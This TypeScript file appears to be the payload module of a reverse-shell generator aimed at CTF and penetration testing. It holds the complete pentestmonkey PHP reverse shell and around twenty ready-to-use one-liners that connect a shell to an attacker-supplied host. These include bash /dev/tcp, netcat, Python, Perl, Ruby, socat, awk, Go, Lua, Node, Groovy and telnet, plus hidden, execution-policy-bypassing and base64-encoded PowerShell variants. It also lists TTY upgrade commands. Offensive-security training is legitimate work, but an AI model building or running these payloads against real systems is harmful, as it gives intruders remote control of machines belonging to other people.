export interface ShellVariant {
  id: string;
  name: string;
  build: (lhost: string, lport: string) => string;
}

export interface TtyUpgrade {
  id: string;
  name: string;
  command: string;
}

export const SHELL_VARIANTS: ShellVariant[] = [
  {
    id: 'php-pentestmonkey',
    name: 'PHP (Pentestmonkey) [most commonly used in CTF]',
    build: (lhost, lport) => `<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '${lhost}';  // CHANGE THIS
$port = ${lport};       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\\n";
	}
}

?>`,
  },
  {
    id: 'bash-tcp',
    name: 'Bash -i',
    build: (lhost, lport) => `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
  },
  {
    id: 'bash-readline',
    name: 'Bash 196',
    build: (lhost, lport) =>
      `0<&196;exec 196<>/dev/tcp/${lhost}/${lport}; sh <&196 >&196 2>&196`,
  },
  {
    id: 'nc-mkfifo',
    name: 'netcat (mkfifo)',
    build: (lhost, lport) =>
      `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
  },
  {
    id: 'nc-e',
    name: 'netcat -e',
    build: (lhost, lport) => `nc -e /bin/sh ${lhost} ${lport}`,
  },
  {
    id: 'ncat-e',
    name: 'ncat -e',
    build: (lhost, lport) => `ncat ${lhost} ${lport} -e /bin/sh`,
  },
  {
    id: 'python3',
    name: 'Python3',
    build: (lhost, lport) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`,
  },
  {
    id: 'perl',
    name: 'Perl',
    build: (lhost, lport) =>
      `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  },
  {
    id: 'php',
    name: 'PHP',
    build: (lhost, lport) =>
      `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    id: 'ruby',
    name: 'Ruby',
    build: (lhost, lport) =>
      `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${lhost}","${lport}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
  },
  {
    id: 'powershell',
    name: 'PowerShell',
    build: (lhost, lport) =>
      `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`,
  },
  {
    id: 'socat',
    name: 'socat',
    build: (lhost, lport) => `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}`,
  },
  {
    id: 'awk',
    name: 'awk',
    build: (lhost, lport) =>
      `awk 'BEGIN{s="/inet/tcp/0/${lhost}/${lport}";for(;s|&getline c;close(c))while((c|getline)>0)print|&s}' /dev/null`,
  },
  {
    id: 'python2',
    name: 'Python2',
    build: (lhost, lport) =>
      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
  },
  {
    id: 'powershell-b64',
    name: 'PowerShell (base64-encoded)',
    build: (lhost, lport) => {
      const raw = `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      return `powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ${toUtf16Base64(raw)}`;
    },
  },
  {
    id: 'go',
    name: 'Go',
    build: (lhost, lport) =>
      `echo 'package main;import("os/exec";"net");func main(){c,_:=net.Dial("tcp","${lhost}:${lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`,
  },
  {
    id: 'lua',
    name: 'Lua',
    build: (lhost, lport) =>
      `lua5.1 -e 'local s=require("socket");local t=assert(s.tcp());t:connect("${lhost}","${lport}");while true do local c=t:receive();local f=io.popen(c,"r");local s=f:read("*a");f:close();t:send(s)end'`,
  },
  {
    id: 'node',
    name: 'Node.js',
    build: (lhost, lport) =>
      `require('child_process').exec('/bin/sh -i <&3 >&3 2>&3',(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(${lport},"${lhost}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})())`,
  },
  {
    id: 'groovy',
    name: 'Groovy',
    build: (lhost, lport) =>
      `String host="${lhost}";int port=${lport};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();`,
  },
  {
    id: 'telnet',
    name: 'Telnet',
    build: (lhost, lport) =>
      `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet ${lhost} ${lport} >/tmp/f`,
  },
];

function toUtf16Base64(command: string): string {
  const utf16 = Array.from(command).flatMap((ch) => {
    const code = ch.charCodeAt(0);
    return [code & 0xff, (code >> 8) & 0xff];
  });
  let binary = '';
  for (const byte of utf16) binary += String.fromCharCode(byte);
  return typeof btoa === 'function' ? btoa(binary) : '';
}

export const TTY_UPGRADES: TtyUpgrade[] = [
  {
    id: 'python-pty',
    name: 'Python pty spawn',
    command: `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
  },
  {
    id: 'stty-raw',
    name: 'Full TTY (stty raw)',
    command: `# in reverse shell:\nexport TERM=xterm\n# background it with Ctrl+Z, then on your listener host:\nstty raw -echo; fg\n# then in the shell:\nreset; export SHELL=bash; export TERM=xterm-256color; stty rows <ROWS> columns <COLS>`,
  },
  {
    id: 'script',
    name: 'script (no python)',
    command: `/usr/bin/script -qc /bin/bash /dev/null`,
  },
  {
    id: 'socat-full-tty',
    name: 'socat full TTY listener',
    command: `socat file:\`tty\`,raw,echo=0 tcp-listen:4444`,
  },
];

export function urlEncodeIfNeeded(command: string, urlEncode: boolean): string {
  return urlEncode ? encodeURIComponent(command) : command;
}
